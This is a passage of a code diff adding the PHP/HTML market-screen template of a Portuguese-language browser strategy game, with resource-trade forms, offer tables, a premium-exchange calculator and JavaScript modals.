+                            <td style="background-color: #f4e4bc; border: 1px solid #7d510f;">
+                                <input name="buy" type="text" size="5" />
+                                <input id="res_buy_wood" name="res_buy" type="radio" value="wood" /> <label for="res_buy_wood"><img src="/graphic/icons/wood.png"></label>
+                                <input id="res_buy_stone" name="res_buy" type="radio" value="stone" checked /> <label for="res_buy_stone"><img src="/graphic/icons/stone.png"></label>
+                                <input id="res_buy_iron" name="res_buy" type="radio" value="iron" /> <label for="res_buy_iron"><img src="/graphic/icons/iron.png"></label>
+                            </td>
+                        </tr>
+                    </table>
+                    <br>
+                    <table class="vis">
+                        <tr>
+                            <th colspan="2" style="text-align: left;"><?= __('screens.market.limitations') ?></th>
+                        </tr>
+                        <tr>
+                            <td><?= __('screens.market.how_many_offers') ?>:</td>
+                            <td><input name="multi" type="text" size="5" value="1" /> <?= __('screens.market.offers') ?></td>
+                        </tr>
+                        <tr>
+                            <td><?= __('screens.market.max_travel_time') ?>:</td>
+                            <td><input name="max_time" type="text" size="5" value="5" /> <?= __('screens.market.hours') ?></td>
+                        </tr>
+                    </table>
+                    <br>
+                    <input type="submit" class="btn btn-send" value="<?= __('screens.market.create_btn') ?>" />
+                </form>
+
+                <?php if (!empty($own_offers)): ?>
+                    <br>
+                    <h3>
+                        <?= __('screens.market.your_offers') ?>
+                    </h3>
+                    <table class="vis" width="100%">
+                        <tr>
+                            <th>
+                                <?= __('screens.market.i_receive') ?>
+                            </th>
+                            <th>
+                                <?= __('screens.market.i_search') ?>
+                            </th>
+                            <th>
+                                <?= __('screens.market.quantity') ?>
+                            </th>
+                            <th>
+                                <?= __('screens.market.action') ?>
+                            </th>
+                        </tr>
+                        <?php foreach ($own_offers as $offer):
+                            // Determine sell type/amount for display (Legacy DB schema vs New schema logic handled here)
+                            $sell_res = ($offer['sell_wood'] > 0) ? 'wood' : (($offer['sell_stone'] > 0) ? 'stone' : 'iron');
+                            $sell_amt = $offer['sell_' . $sell_res];
+                            $buy_res = ($offer['buy_wood'] > 0) ? 'wood' : (($offer['buy_stone'] > 0) ? 'stone' : 'iron');
+                            $buy_amt = $offer['buy_' . $buy_res];
+                            ?>
+                            <tr>
+                                <td><img
+                                        src="/graphic/<?= $sell_res == 'stone' ? 'lehm' : ($sell_res == 'wood' ? 'holz' : 'eisen') ?>.png">
+                                    <?= $sell_amt ?>
+                                </td>
+                                <td><img
+                                        src="/graphic/<?= $buy_res == 'stone' ? 'lehm' : ($buy_res == 'wood' ? 'holz' : 'eisen') ?>.png">
+                                    <?= $buy_amt ?>
+                                </td>
+                                <td>
+                                    <?= $offer['multi'] ?>x
+                                </td>
+                                <td><a class="btn btn-cancel" href="game.php?village=<?= $village['id'] ?>&screen=market&mode=own_offer&action=cancel_offer&id=<?= $offer['id'] ?>&h=<?= $user['hkey'] ?? '' ?>">
+                                        <?= __('screens.market.cancel') ?>
+                                    </a>
+                                </td>
+                            </tr>
+                        <?php endforeach; ?>
+                    </table>
+                <?php endif; ?>
+
+            <?php elseif ($active_mode === 'other_offer'): ?>
+                <!-- MODE: OTHER OFFERS - Image 1 Style -->
+                <h3><?= __('screens.market.search_offers') ?></h3>
+
+                <!-- Filter Form (Horizontal) -->
+                <form action="game.php" method="get">
+                    <input type="hidden" name="village" value="<?= $village['id'] ?>" />
+                    <input type="hidden" name="screen" value="market" />
+                    <input type="hidden" name="mode" value="other_offer" />
+                    
+                    <table class="vis" width="100%">
+                        <tr>
+                            <td width="150" style="background-color: #f4e4bc; border: 1px solid #7d510f;"><b><?= __('screens.market.i_want') ?>:</b></td>
+                            <td style="background-color: #f4e4bc; border: 1px solid #7d510f;">
+                                <input type="radio" name="filter_sell" value="all" id="qs_all" <?= ($filters['sell'] ?? '') === 'all' ? 'checked' : '' ?>> <label for="qs_all"><?= __('screens.market.all') ?></label>
+                                <input type="radio" name="filter_sell" value="wood" id="qs_wood" <?= ($filters['sell'] ?? '') === 'wood' ? 'checked' : '' ?>> <label for="qs_wood"><img src="/graphic/icons/wood.png"></label>
+                                <input type="radio" name="filter_sell" value="stone" id="qs_stone" <?= ($filters['sell'] ?? '') === 'stone' ? 'checked' : '' ?>> <label for="qs_stone"><img src="/graphic/icons/stone.png"></label>
+                                <input type="radio" name="filter_sell" value="iron" id="qs_iron" <?= ($filters['sell'] ?? '') === 'iron' ? 'checked' : '' ?>> <label for="qs_iron"><img src="/graphic/icons/iron.png"></label>
+                            </td>
+                            <td rowspan="2" align="center" width="50">
+                                <img src="/graphic/new/swap.webp" style="cursor: pointer;" title="Alternar" onclick="SwapMarketFilters()">
+                            </td>
+                        </tr>
+                        <tr>
+                            <td style="background-color: #f4e4bc; border: 1px solid #7d510f;"><b><?= __('screens.market.i_offer') ?>:</b></td>
+                            <td style="background-color: #f4e4bc; border: 1px solid #7d510f;">
+                                <input type="radio" name="filter_buy" value="all" id="of_all" <?= ($filters['buy'] ?? '') === 'all' ? 'checked' : '' ?>> <label for="of_all"><?= __('screens.market.all') ?></label>
+                                <input type="radio" name="filter_buy" value="wood" id="of_wood" <?= ($filters['buy'] ?? '') === 'wood' ? 'checked' : '' ?>> <label for="of_wood"><img src="/graphic/icons/wood.png"></label>
+                                <input type="radio" name="filter_buy" value="stone" id="of_stone" <?= ($filters['buy'] ?? '') === 'stone' ? 'checked' : '' ?>> <label for="of_stone"><img src="/graphic/icons/stone.png"></label>
+                                <input type="radio" name="filter_buy" value="iron" id="of_iron" <?= ($filters['buy'] ?? '') === 'iron' ? 'checked' : '' ?>> <label for="of_iron"><img src="/graphic/icons/iron.png"></label>
+                            </td>
+                        </tr>
+                    </table>
+                    <br>
+                    <table class="vis">
+                        <tr>
+                            <th colspan="4" style="text-align: left;"><?= __('screens.market.limitations') ?></th>
+                        </tr>
+                        <tr>
+                            <td><?= __('screens.market.duration') ?>:</td>
+                            <td>
+                                <select name="limit_duration">
+                                    <option value="2"><?= sprintf(__('screens.market.x_hours'), 2) ?></option>
+                                    <option value="5" <?= ($filters['limit_duration'] == 5) ? 'selected' : '' ?>><?= sprintf(__('screens.market.x_hours'), 5) ?></option>
+                                    <option value="10" <?= ($filters['limit_duration'] == 10) ? 'selected' : '' ?>><?= sprintf(__('screens.market.x_hours'), 10) ?></option>
+                                    <option value="24" <?= ($filters['limit_duration'] == 24) ? 'selected' : '' ?>><?= sprintf(__('screens.market.x_hours'), 24) ?></option>
+                                    <option value="0" <?= ($filters['limit_duration'] == 0) ? 'selected' : '' ?>><?= __('screens.market.all') ?></option>
+                                </select>
+                            </td>
+                            <td><?= __('screens.market.filter') ?>:</td>
+                            <td>
+                                <select name="ratio">
+                                    <option value="0"><?= __('screens.market.show_all') ?></option>
+                                    <option value="1.0" <?= ($filters['ratio'] == 1.0) ? 'selected' : '' ?>><?= __('screens.market.max_ratio_1') ?></option>
+                                    <option value="1.5" <?= ($filters['ratio'] == 1.5) ? 'selected' : '' ?>><?= __('screens.market.max_ratio_15') ?></option>
+                                </select>
+                            </td>
+                            <td>
+                                <input type="checkbox" name="only_friends" id="fl_friends" <?= ($filters['only_friends'] ?? false) ? 'checked' : '' ?>> <label for="fl_friends"><?= __('screens.market.only_friends') ?></label><br>
+                                <input type="checkbox" name="exclude_enemies" id="fl_enemies" <?= ($filters['exclude_enemies'] ?? false) ? 'checked' : '' ?>> <label for="fl_enemies"><?= __('screens.market.exclude_enemies') ?></label>
+                            </td>
+                            <td><input type="submit" value="<?= __('screens.market.search') ?>" class="btn"></td>
+                        </tr>
+                    </table>
+                </form>
+
+                <script>
+                function SwapMarketFilters() {
+                    const sellVal = $('input[name="filter_sell"]:checked').val();
+                    const buyVal = $('input[name="filter_buy"]:checked').val();
+                    
+                    if (sellVal !== 'all' && buyVal !== 'all') {
+                        $(`input[name="filter_sell"][value="${buyVal}"]`).prop('checked', true);
+                        $(`input[name="filter_buy"][value="${sellVal}"]`).prop('checked', true);
+                    }
+                }
+                </script>
+
+                <br>
+
+                <?php if (!empty($other_offers)): ?>
+                    <table class="vis" width="100%">
+                        <tr>
+                            <th><?= __('screens.market.recebo') ?></th>
+                            <th><?= __('screens.market.procuro') ?></th>
+                            <th><?= __('screens.market.jogador') ?></th>
+                            <th><?= __('screens.market.duracao') ?></th>
+                            <th><?= __('screens.market.racio') ?></th>
+                            <th><?= __('screens.market.disponibilidade') ?></th>
+                            <th><?= __('screens.market.aceitar_btn') ?></th>
+                        </tr>
+                        <?php foreach ($other_offers as $offer):
+                            $sell_res = ($offer['sell_wood'] > 0) ? 'wood' : (($offer['sell_stone'] > 0) ? 'stone' : 'iron');
+                            $sell_amt = $offer['sell_' . $sell_res];
+                            $buy_res = ($offer['buy_wood'] > 0) ? 'wood' : (($offer['buy_stone'] > 0) ? 'stone' : 'iron');
+                            $buy_amt = $offer['buy_' . $buy_res];
+                            $ratio = round($buy_amt / $sell_amt, 2);
+                            $ratio_img = ($ratio <= 1.0) ? 'ratio_green' : (($ratio <= 1.5) ? 'ratio_yellow' : 'ratio_red');
+                            ?>
+                            <tr>
+                                <td><img src="/graphic/<?= $buy_res == 'stone' ? 'lehm' : ($buy_res == 'wood' ? 'holz' : 'eisen') ?>.png"> <?= number_format($buy_amt, 0, ',', '.') ?></td>
+                                <td><img src="/graphic/<?= $sell_res == 'stone' ? 'lehm' : ($sell_res == 'wood' ? 'holz' : 'eisen') ?>.png"> <?= number_format($sell_amt, 0, ',', '.') ?></td>
+                                <td>
+                                    <a href="game.php?village=<?= $village['id'] ?>&screen=info_player&id=<?= $offer['seller_userid'] ?>">
+                                        <?= htmlspecialchars($offer['username'] ?? __('screens.market.unknown')) ?>
+                                    </a>
+                                </td>
+                                <td><?= format_time($offer['duration']) ?></td>
+                                <td align="center">
+                                    <img src="/graphic/<?= $ratio_img ?>.png" title="Rácio: <?= $ratio ?>"> <?= $ratio ?>
+                                </td>
+                                <td><?= $offer['multi'] ?> <?= __('screens.market.offers') ?></td>
+                                <td>
+                                    <form action="game.php?village=<?= $village['id'] ?>&screen=market&mode=other_offer&action=accept_offer&id=<?= $offer['id'] ?>&h=<?= $user['hkey'] ?? '' ?>" method="post">
+                                        <input type="text" name="amount" size="3" value="1">
+                                        (<?= $offer['multi'] ?>)
+                                        <input type="submit" value="<?= __('screens.market.accept') ?>" class="btn">
+                                    </form>
+                                </td>
+                            </tr>
+                        <?php endforeach; ?>
+                    </table>
+                <?php else: ?>
+                    <p><?= __('screens.market.no_offers') ?></p>
+                <?php endif; ?>
+
+            <?php elseif ($active_mode === 'premium'): ?>
+                <!-- MODE: PREMIUM EXCHANGE - Based on Screenshot -->
+                <h3><?= __('screens.market.premium_exchange') ?></h3>
+                <p>
+                    <?= __('screens.market.premium_exchange_desc') ?? 'Utilize a Troca Premium para trocar pontos premium por recursos e vice-versa.' ?> <a href="javascript:void(0)" onclick="ShowPremiumExchangeInfo()"><?= __('screens.common.learn_more') ?? 'Descobre mais' ?></a> <i>i</i>.
+                </p>
+
+                <?php if (isset($_GET['msg'])): ?>
+                    <div style="font-weight:bold; color:green; margin-bottom: 10px; border: 1px solid green; padding: 5px; background: #e0ffe0;">
+                        <?php if ($_GET['msg'] === 'success_buy') echo 'Compra realizada com sucesso!'; ?>
+                        <?php if ($_GET['msg'] === 'success_sell') echo 'Venda realizada com sucesso!'; ?>
+                    </div>
+                <?php endif; ?>
+
+                <table class="vis premium-exchange" width="100%">
+                    <tr>
+                        <th width="150" style="background: none;"></th>
+                        <th><img src="/graphic/icons/wood.png"> <?= __('screens.market.wood') ?></th>
+                        <th><img src="/graphic/icons/stone.png"> <?= __('screens.market.clay') ?></th>
+                        <th><img src="/graphic/icons/iron.png"> <?= __('screens.market.iron') ?></th>
+                    </tr>
+                    <tr>
+                        <td class="premium-label"><b><?= __('screens.market.stock') ?></b></td>
+                        <td align="center" style="color: red; font-weight: bold;"><?= number_format($stock['wood']) ?></td>
+                        <td align="center" style="color: red; font-weight: bold;"><?= number_format($stock['stone']) ?></td>
+                        <td align="center" style="color: red; font-weight: bold;"><?= number_format($stock['iron']) ?></td>
+                    </tr>
+                    <tr>
+                        <td class="premium-label"><b><?= __('screens.market.capacity') ?></b></td>
+                        <td align="center"><?= number_format($stock['wood_capacity']) ?></td>
+                        <td align="center"><?= number_format($stock['stone_capacity']) ?></td>
+                        <td align="center"><?= number_format($stock['iron_capacity']) ?></td>
+                    </tr>
+                    <tr>
+                        <td class="premium-label"><b><?= __('screens.market.rate') ?></b></td>
+                        <td align="center"><img src="/graphic/icons/wood.png"> <?= $rates['wood'] ?> &harr; <img src="/graphic/new/premium/coinbag_15x15.png"> 1</td>
+                        <td align="center"><img src="/graphic/icons/stone.png"> <?= $rates['stone'] ?> &harr; <img src="/graphic/new/premium/coinbag_15x15.png"> 1</td>
+                        <td align="center"><img src="/graphic/icons/iron.png"> <?= $rates['iron'] ?> &harr; <img src="/graphic/new/premium/coinbag_15x15.png"> 1</td>
+                    </tr>
+                     <tr>
+                        <td class="premium-label"><b><?= __('screens.market.premium_buy') ?></b></td>
+                        <td align="center">
+                            <input type="text" id="buy_wood" class="pe-input" data-res="wood" data-type="buy" size="5" placeholder="0"> &harr; <img src="/graphic/new/premium/coinbag_15x15.png"> <span id="calc_pp_wood">0</span>
+                        </td>
+                        <td align="center">
+                            <input type="text" id="buy_stone" class="pe-input" data-res="stone" data-type="buy" size="5" placeholder="0"> &harr; <img src="/graphic/new/premium/coinbag_15x15.png"> <span id="calc_pp_stone">0</span>
+                        </td>
+                        <td align="center">
+                            <input type="text" id="buy_iron" class="pe-input" data-res="iron" data-type="buy" size="5" placeholder="0"> &harr; <img src="/graphic/new/premium/coinbag_15x15.png"> <span id="calc_pp_iron">0</span>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td class="premium-label"><b><?= __('screens.market.premium_sell') ?></b></td>
+                        <td align="center">
+                            <input type="text" id="sell_wood" class="pe-input" data-res="wood" data-type="sell" size="5" placeholder="0"> &harr; <img src="/graphic/new/premium/coinbag_15x15.png"> <span id="calc_earn_wood">0</span>
+                        </td>
+                        <td align="center">
+                            <input type="text" id="sell_stone" class="pe-input" data-res="stone" data-type="sell" size="5" placeholder="0"> &harr; <img src="/graphic/new/premium/coinbag_15x15.png"> <span id="calc_earn_stone">0</span>
+                        </td>
+                        <td align="center">
+                            <input type="text" id="sell_iron" class="pe-input" data-res="iron" data-type="sell" size="5" placeholder="0"> &harr; <img src="/graphic/new/premium/coinbag_15x15.png"> <span id="calc_earn_iron">0</span>
+                        </td>
+                    </tr>
+                </table>
+                <div align="right" style="margin-top: 5px;">
+                    <input type="button" value="<?= __('screens.market.calculate_best_offer') ?? 'Calcular melhor oferta' ?>" class="btn" onclick="CalculateBestOffer()">
+                </div>
+
+                <br>
+                <div class="vis" style="padding: 0;">
+                    <div style="background: #e3c485; padding: 5px; border-bottom: 1px solid #7d510f;">
+                        <b><?= __('screens.market.average_price') ?? 'Média de preço' ?> de <img src="/graphic/new/premium/coinbag_15x15.png"> (<?= __('screens.market.last_7_days') ?? 'últimos 7 dias' ?>)</b>
+                    </div>
+                    <div style="height: 180px; background: #f4e4bc; padding: 10px; position: relative;">
+                        <!-- Chart Legend -->
+                        <div style="position: absolute; right: 20px; top: 10px; font-size: 10px;">
+                            <span style="display:inline-block; width:10px; height:10px; background:#7d510f;"></span> <?= __('screens.market.rate') ?>
+                        </div>
+                        
+                        <!-- Chart Area -->
+                        <div style="position: absolute; left: 40px; top: 20px; border-left: 2px solid #7d510f; border-bottom: 2px solid #7d510f; width: calc(100% - 60px); height: 120px;">
+                            <!-- Grid Lines -->
+                            <div style="position: absolute; bottom: 50%; width: 100%; border-top: 1px dashed #dcb67d;"></div>
+                            
+                            <!-- Resource Curves (Conceptual) -->
+                            <svg width="100%" height="100%" preserveAspectRatio="none" style="position:absolute; bottom:0;">
+                                <!-- Price Curve -->
+                                <path d="M0,120 Q50,60 100,20" stroke="#7d510f" stroke-width="2" fill="none" vector-effect="non-scaling-stroke" />
+                                
+                                <!-- Current Stock Points -->
+                                <?php 
+                                    $wood_x = ($stock['wood'] / $stock['wood_capacity']) * 100;
+                                    $wood_y = 120 - (($rates['wood'] / 112) * 120);
+                                    $stone_x = ($stock['stone'] / $stock['stone_capacity']) * 100;
+                                    $stone_y = 120 - (($rates['stone'] / 112) * 120);
+                                    $iron_x = ($stock['iron'] / $stock['iron_capacity']) * 100;
+                                    $iron_y = 120 - (($rates['iron'] / 112) * 120);
+                                ?>
+                                <circle cx="<?= $wood_x ?>%" cy="<?= $wood_y ?>" r="5" fill="#8d5932" stroke="#fff" stroke-width="1" />
+                                <circle cx="<?= $stone_x ?>%" cy="<?= $stone_y ?>" r="5" fill="#cc5500" stroke="#fff" stroke-width="1" />
+                                <circle cx="<?= $iron_x ?>%" cy="<?= $iron_y ?>" r="5" fill="#333333" stroke="#fff" stroke-width="1" />
+                            </svg>
+                            
+                            <!-- Y-Axis Labels -->
+                            <div style="position: absolute; left: -35px; top: 0; font-size: 9px;">112</div>
+                            <div style="position: absolute; left: -35px; bottom: 0; font-size: 9px;">56</div>
+                        </div>
+                        
+                        <!-- X-Axis Labels -->
+                        <div style="position: absolute; left: 40px; bottom: 15px; width: calc(100% - 60px); display: flex; justify-content: space-between; font-size: 9px;">
+                            <span>0% Stock</span>
+                            <span>50%</span>
+                            <span>100% Stock</span>
+                        </div>
+                    </div>
+                    <div style="background: #f4e4bc; padding: 5px; text-align: center; font-size: 0.8em; border-top: 1px solid #7d510f;">
+                        <span style="color: #8d5932;">■ <?= __('screens.market.wood') ?></span> &nbsp; <span style="color: #cc5500;">■ <?= __('screens.market.clay') ?></span> &nbsp; <span style="color: #333333;">■ <?= __('screens.market.iron') ?></span>
+                    </div>
+                </div>
+
+                <script>
+                const rates = <?= json_encode($rates) ?>;
+
+                $('.pe-input').on('input', function() {
+                    const val = parseInt($(this).val()) || 0;
+                    const res = $(this).data('res');
+                    const type = $(this).data('type');
+                    const rate = rates[res === 'stone' ? 'stone' : (res === 'wood' ? 'wood' : 'iron')];
+                    
+                    if (type === 'buy') {
+                        $(`#calc_pp_${res}`).text(Math.ceil(val / rate));
+                    } else {
+                        $(`#calc_earn_${res}`).text(Math.floor(val / rate));
+                    }
+                });
+
+                function CalculateBestOffer() {
+                    const buys = { 
+                        wood: parseInt($('#buy_wood').val()) || 0,
+                        stone: parseInt($('#buy_stone').val()) || 0,
+                        iron: parseInt($('#buy_iron').val()) || 0
+                    };
+                    const sells = {
+                        wood: parseInt($('#sell_wood').val()) || 0,
+                        stone: parseInt($('#sell_stone').val()) || 0,
+                        iron: parseInt($('#sell_iron').val()) || 0
+                    };
+
+                    let totalPP = 0;
+                    let totalEarn = 0;
+                    let items = [];
+
+                    for (let res in buys) {
+                        if (buys[res] > 0) {
+                            let cost = Math.ceil(buys[res] / rates[res]);
+                            totalPP += cost;
+                            items.push({ 
+                                type: 'buy', 
+                                res: res, 
+                                amount: buys[res], 
+                                best: cost * rates[res],
+                                pp: cost 
+                            });
+                        }
+                    }
+                    for (let res in sells) {
+                        if (sells[res] > 0) {
+                            let earn = Math.floor(sells[res] / rates[res]);
+                            totalEarn += earn;
+                            items.push({ 
+                                type: 'sell', 
+                                res: res, 
+                                amount: sells[res], 
+                                best: earn * rates[res],
+                                pp: earn 
+                            });
+                        }
+                    }
+
+                    if (items.length === 0) return;
+
+                    ShowReviewExchangeOffer(items, totalPP - totalEarn);
+                }
+
+                function ShowReviewExchangeOffer(items, finalPP) {
+                    const trans = {
+                        title: "<?= __('screens.market.review_exchange_offer') ?>",
+                        your_order: "<?= __('screens.market.your_order') ?>",
+                        best_match: "<?= __('screens.market.best_match') ?>",
+                        cost: "<?= __('screens.market.exchange_cost') ?>",
+                        confirm: "<?= __('screens.common.confirm') ?? 'Confirmar' ?>",
+                        cancel: "<?= __('screens.common.cancel') ?? 'Cancelar' ?>",
+                        buy: "<?= __('screens.market.buy_res') ?>",
+                        sell: "<?= __('screens.market.sell_res') ?>"
+                    };
+
+                    const resIcons = {
+                        wood: '/graphic/icons/wood.png',
+                        stone: '/graphic/icons/stone.png',
+                        iron: '/graphic/icons/iron.png'
+                    };
+
+                    let itemsHtml = '';
+                    items.forEach(item => {
+                        let icon = `<img src="${resIcons[item.res]}">`;
+                        let label = item.type === 'buy' ? trans.buy.replace('{res}', icon) : trans.sell.replace('{res}', icon);
+                        
+                        itemsHtml += `
+                            <tr>
+                                <td style="padding: 10px; border-bottom: 1px solid #7d510f;">${label} ${item.amount} por <img src="/graphic/new/premium/coinbag_15x15.png"> ${item.pp}</td>
+                                <td style="padding: 10px; border-bottom: 1px solid #7d510f; background: #e5d5ad;">${label} ${item.best} por <img src="/graphic/new/premium/coinbag_15x15.png"> ${item.pp}</td>
+                            </tr>
+                        `;
+                    });
+
+                    let modalHtml = `
+                        <div id="review-modal" style="position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.7); z-index:11000; display:flex; align-items:center; justify-content:center;">
+                            <div style="background:#f4e4bc; border:2px solid #7d510f; width:500px; padding:20px; box-shadow: 0 0 20px rgba(0,0,0,0.5); border-radius:5px;">
+                                <h2 style="color:#7d510f; margin-top:0;">${trans.title}</h2>
+                                
+                                <table width="100%" style="border-collapse: collapse;">
+                                    <tr>
+                                        <th align="left" style="background:#c1a264; padding:5px;">${trans.your_order}</th>
+                                        <th align="left" style="background:#c1a264; padding:5px;">${trans.best_match}</th>
+                                    </tr>
+                                    ${itemsHtml}
+                                </table>
+                                
+                                <p style="margin-top:20px; font-weight:bold;">${trans.cost} <img src="/graphic/new/premium/coinbag_15x15.png"> ${Math.abs(finalPP)}</p>
+                                
+                                <div style="text-align:center; margin-top:30px;">
+                                    <button class="btn btn-confirm-yes" id="confirm-exchange" style="padding:8px 25px; font-weight:bold;">${trans.confirm}</button>
+                                    <button class="btn btn-confirm-no" onclick="$('#review-modal').remove()" style="padding:8px 25px; font-weight:bold; margin-left:10px;">${trans.cancel}</button>
+                                </div>
+                            </div>
+                        </div>
+                    `;
+
+                    $('body').append(modalHtml);
+
+                    $('#confirm-exchange').on('click', function() {
+                        $(this).prop('disabled', true).text('...');
+                        
+                        // Submit all items
+                        // For simplicity in this engine, we'll loop or send a combined request.
+                        // I'll implement a combined action in MarketScreen.php if needed, 
+                        // but for now let's use a hidden form to submit.
+                        
+                        let form = $('<form action="game.php?village=<?= $village['id'] ?>&screen=market&mode=premium&action=multi&h=<?= $user['hkey'] ?>" method="post"></form>');
+                        items.forEach((item, idx) => {
+                            form.append(`<input type="hidden" name="items[${idx}][type]" value="${item.type}">`);
+                            form.append(`<input type="hidden" name="items[${idx}][res]" value="${item.res}">`);
+                            form.append(`<input type="hidden" name="items[${idx}][amount]" value="${item.best}">`);
+                        });
+                        $('body').append(form);
+                        form.submit();
+                    });
+                }
+
+                function ShowPremiumExchangeInfo() {
+                    const info = <?= json_encode(__('screens.market.premium_exchange_info')) ?>;
+                    
+                    let html = `
+                        <div id="premium-info-modal" style="position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.7); z-index:10000; display:flex; align-items:center; justify-content:center;">
+                            <div style="background:#f4e4bc url('/graphic/index/main_bg.jpg'); border:2px solid #7d510f; width:600px; max-height:80%; overflow-y:auto; padding:20px; position:relative; box-shadow: 0 0 20px rgba(0,0,0,0.5); border-radius:5px;">
+                                <a href="javascript:void(0)" onclick="$('#premium-info-modal').remove()" style="position:absolute; top:10px; right:15px; font-size:24px; color:#7d510f; text-decoration:none; font-weight:bold;">&times;</a>
+                                
+                                <h2 style="color:#7d510f; border-bottom:1px solid #7d510f; padding-bottom:10px; margin-top:0;">${info.title}</h2>
+                                <p><b>${info.intro}</b></p>
+                                
+                                <h3 style="color:#7d510f; margin-top:20px;">${info.capacity_title}</h3>
+                                <p>${info.capacity_body}</p>
+                                
+                                <h3 style="color:#7d510f; margin-top:20px;">${info.request_title}</h3>
+                                <p>${info.request_body}</p>
+                                
+                                <h3 style="color:#7d510f; margin-top:20px;">${info.exchange_title}</h3>
+                                <p>${info.exchange_body}</p>
+                                
+                                <h3 style="color:#7d510f; margin-top:20px;">${info.fees_title}</h3>
+                                <p>${info.fees_body}</p>
+                                
+                                <div style="text-align:center; margin-top:30px;">
+                                    <button class="btn" onclick="$('#premium-info-modal').remove()" style="padding:5px 20px;"><?= __('screens.common.ok') ?? 'OK' ?></button>
+                                </div>
+                            </div>
+                        </div>
+                    `;
+                    
+                    $('body').append(html);
+                    
+                    // Close on escape
+                    $(document).one('keydown', function(e) {
+                        if (e.keyCode === 27) $('#premium-info-modal').remove();
+                    });
+                    
+                    // Close on click outside
+                    $('#premium-info-modal').on('click', function(e) {
+                        if (e.target === this) $(this).remove();
+                    });
+                }
+                </script>
+
+            <?php endif; ?>
+
+        </td>
+    </tr>
+</table>
+
+<!-- Market Villages Modal -->
+<div id="market_villages_modal"
+    style="display:none; position:fixed; z-index:9999; left:0; top:0; width:100%; height:100%; background-color:rgba(0,0,0,0.6);">
+    <div id="market_modal_container"
+        style="background-color: #f7eed3; border: 2px solid #804000; width: 500px; margin: 100px auto; padding: 10px; position: relative; box-shadow: 0px 0px 15px #000;">
+        <div id="market_modal_header"
+            style="background-color: #c1a264; padding: 5px; border: 1px solid #7d510f; color: #fff; font-weight: bold; margin-bottom: 10px;">
+            <span><?= __('screens.market.your_villages') ?? 'As suas aldeias' ?></span>
+            <span onclick="closeMarketVillagesModal()"
+                style="float: right; cursor: pointer; color: #5c0d0d; background: #e3d5b3; border: 1px solid #804000; padding: 0 5px;">X</span>
+        </div>
+        <div id="market_modal_content" style="padding: 10px; max-height: 400px; overflow-y: auto;">
+            <p style="text-align: center;"><?= __('screens.place.loading') ?? 'A carregar...' ?></p>
+        </div>
+    </div>
+</div>
+
+<script type="text/javascript">
+    function showMarketVillagesModal() {
+        var modal = document.getElementById('market_villages_modal');
+        var content = document.getElementById('market_modal_content');
+        
+        modal.style.display = 'block';
+        content.innerHTML = '<p style="text-align: center;"><?= addslashes(__('screens.place.loading') ?? 'A carregar...') ?></p>';
+
+        fetch('game.php?village=<?= $village['id'] ?>&screen=popup&mode=villages')
+            .then(response => response.text())
+            .then(html => {
+                var parser = new DOMParser();
+                var doc = parser.parseFromString(html, 'text/html');
+                var table = doc.querySelector('table');
+                if (table) {
+                    content.innerHTML = '';
+                    content.appendChild(table);
+                    
+                    // Add click handler mapping
+                    var links = content.querySelectorAll('a');
+                    links.forEach(function (link) {
+                        link.addEventListener('click', function (e) {
+                            e.preventDefault();
+                            var onclick = this.getAttribute('onclick');
+                            var x, y;
+                            
+                            if (onclick) {
+                                var xMatch = onclick.match(/insertNumId\('x',\s*'(\d+)'\)/);
+                                var yMatch = onclick.match(/insertNumId\('y',\s*'(\d+)'\)/);
+                                if (xMatch && yMatch) {
+                                    x = xMatch[1];
+                                    y = yMatch[1];
+                                }
+                            }
+                            
+                            if (!x || !y) {
+                                var text = this.textContent;
+                                var match = text.match(/(\d+)\|(\d+)/);
+                                if (match) {
+                                    x = match[1];
+                                    y = match[2];
+                                }
+                            }
+                            
+                            if (x && y) {
+                                $('#market_destination_input').val(x + '|' + y).trigger('input');
+                                closeMarketVillagesModal();
+                            }
+                        });
+                    });
+                } else {
+                    content.innerHTML = '<p style="text-align: center; color: #999;"><?= addslashes(__('screens.market.no_other_villages') ?? 'Nenhuma outra aldeia') ?></p>';
+                }
+            })
+            .catch(err => {
+                console.error(err);
+                content.innerHTML = '<p style="text-align: center; color: red;">Erro ao carregar aldeias.</p>';
+            });
+    }
+
+    function closeMarketVillagesModal() {
+        document.getElementById('market_villages_modal').style.display = 'none';
+    }
+
+    // Close modal when clicking outside
+    document.getElementById('market_villages_modal').addEventListener('click', function (e) {
+        if (e.target.id === 'market_villages_modal') {
+            closeMarketVillagesModal();
+        }
+    });
+</script>
